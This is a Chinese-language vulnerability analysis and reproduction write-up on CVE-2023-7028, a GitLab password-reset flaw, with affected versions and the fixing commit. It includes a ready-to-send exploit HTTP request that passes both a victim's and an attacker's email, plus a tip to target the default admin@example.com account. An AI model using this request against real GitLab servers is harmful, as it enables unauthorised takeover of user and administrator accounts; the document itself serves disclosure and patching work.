<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="253d0cb4d8229929e9190ce968db9495">GitLab任意用户接管漏洞分析复现（CVE-2023-7028）</h1>
<h2 data-content="1" id="5d3a2d55d8eabfcefed2d651fb6b5b3d">漏洞描述</h2>
<p>2024年1月11日，Gitlab官方披露CVE-2023-7028 GitLab 任意用户密码重置漏洞，官方评级严重。攻击者可利用忘记密码功能，构造恶意请求获取密码重置链接从而重置密码。官方已发布安全更新，建议升级至最新版本，若无法升级，建议利用安全组功能设置Gitlab仅对可信地址开放。</p>
<h3 data-content="1" id="72fae0528c1c9335ca0af002b3180de6">影响范围</h3>
<blockquote>
<p>16.1 &lt;= Gitlab &lt; 16.1.6</p>
<p>16.2 &lt;= Gitlab &lt; 16.2.9</p>
<p>16.3 &lt;= Gitlab &lt; 16.3.7</p>
<p>16.4 &lt;= Gitlab &lt; 16.4.5</p>
<p>16.5 &lt;= Gitlab &lt; 16.5.6</p>
<p>16.6 &lt;= Gitlab &lt; 16.6.4</p>
<p>16.7 &lt;= Gitlab &lt; 16.7.2</p>
</blockquote>
<p><strong>这里需要注意的是，该漏洞于 2023 年 5 月 1 日在 16.1.0 中引入。所以低于Gitlab主线版本低于16.1.0环境不受该漏洞影响。</strong></p>
<h3 data-content="1" id="c0c443b3fb166fb83489f1a5789dc14f">漏洞利用前置条件</h3>
<p>1、知道任意用户的邮箱</p>
<p>2、管理员正确配置了邮件服务</p>
<h2 data-content="1" id="4f2ff81b982c22f2301781492667701b">代码分析</h2>
<p>根据官方的<a href="https://gitlab.com/rluna-gitlab/gitlab-ce/-/commit/24d1060c0ae7d0ba432271da98f4fa20ab6fd671" target="_blank">commit记录</a>来看，很容易就能发现问题——限制了邮件发送的数量。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240116003924-a4085d56-b3c4-1.png"/></p>
<h2 data-content="1" id="2687f5f0a336640cc730b87bdbf15109">漏洞复现</h2>
<p>知道了漏洞的原理，接下来就开始漏洞复现。</p>
<p>首先访问<code>/users/password/new</code>进入到重置密码的页面，输入一个你知道的用户，然后使用Burp或者其他工具抓包。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240116003935-aa853d2a-b3c4-1.png"/></p>
<pre><code>POST /users/password HTTP/1.1
Host: 1.1.1.1
Content-Length: 169
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://1.1.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Referer: http://1.1.1.1:8090/users/password/new
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: _gitlab_session=e8eb950940d6e5d7c3820e6c9e103d7b
DNT: 1
Sec-GPC: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Connection: close

authenticity_token=LnGtHYZiXkXxCGby0lK-Krqy79_lJlbjWsYjz7exHItcrWDAQQX4Yb1rV9J5y4V89Ik8U9UpTbro8owRoekdAA&amp;user%5Bemail%5D%5B%5D=poc1%40163.com&amp;user%5Bemail%5D%5B%5D=attack%40qq.com</code></pre>
<p>第一个邮箱处填写获取到的邮箱，第二个邮箱写上你自己的邮箱，然后发包，过一会你的邮箱就会收到一封密码重置的邮件，然而这个邮件里面的重置连接是另一个用户的，效果如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240116004034-cde3d466-b3c4-1.png"/><br/>
可以看到把重置密码的邮件同时发给了两个邮箱，然而第二个邮箱是没有经过验证的攻击者的邮箱，攻击者收到邮件后直接点击重置密码，就可以接管对应的账户了。</p>
<h2 data-content="1" id="c0c27496b235cbf71813298d7d52d0ec">后续利用</h2>
<h3 data-content="1" id="c642400c15a80cb00e2b2aae731e8948">Gitlab版本判断</h3>
<p><a href="https://github.com/righel/gitlab-version-nse/" target="_blank">https://github.com/righel/gitlab-version-nse/</a></p>
<h3 data-content="1" id="65df4d3c404e46ecf8e9cf63e682cf22">重置管理员账号</h3>
<p>在gitlab安装时，管理员的默认账户为<code>admin@example.com</code>，所以可以通过直接重置默认邮箱，大概率能直接接管gialab管理员的账号。</p>
</div>
</div>